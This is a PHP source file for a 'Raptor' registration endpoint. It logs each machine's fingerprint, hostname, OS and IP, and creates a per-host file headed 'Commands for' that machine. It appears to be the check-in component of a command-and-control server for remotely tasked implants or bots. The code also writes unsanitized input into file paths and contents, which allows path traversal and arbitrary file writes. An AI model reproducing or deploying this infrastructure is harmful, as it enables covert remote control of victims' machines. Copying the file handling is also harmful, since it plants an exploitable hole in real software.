<?php
// register.php - Raptor Registration Endpoint

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

// Get registration data
$fingerprint = $_POST['fingerprint'] ?? '';
$hostname = $_POST['hostname'] ?? '';
$os = $_POST['os'] ?? '';
$timestamp = date('Y-m-d H:i:s');

if (empty($fingerprint)) {
    http_response_code(400);
    echo json_encode(['error' => 'Fingerprint required']);
    exit;
}

// Log registration
$log_entry = [
    'timestamp' => $timestamp,
    'fingerprint' => $fingerprint,
    'hostname' => $hostname,
    'os' => $os,
    'ip' => $_SERVER['REMOTE_ADDR']
];

// Save to registrations log
file_put_contents(
    'registrations.log', 
    json_encode($log_entry) . PHP_EOL,
    FILE_APPEND | LOCK_EX
);

// Create empty host file if doesn't exist
$host_file = "hosts/{$fingerprint}.txt";
if (!file_exists($host_file)) {
    file_put_contents($host_file, "# Commands for {$fingerprint}\n# Hostname: {$hostname}\n# OS: {$os}\n# Registered: {$timestamp}\n\n");
}

echo json_encode([
    'status' => 'success',
    'fingerprint' => $fingerprint,
    'message' => 'Registration successful'
]);
?>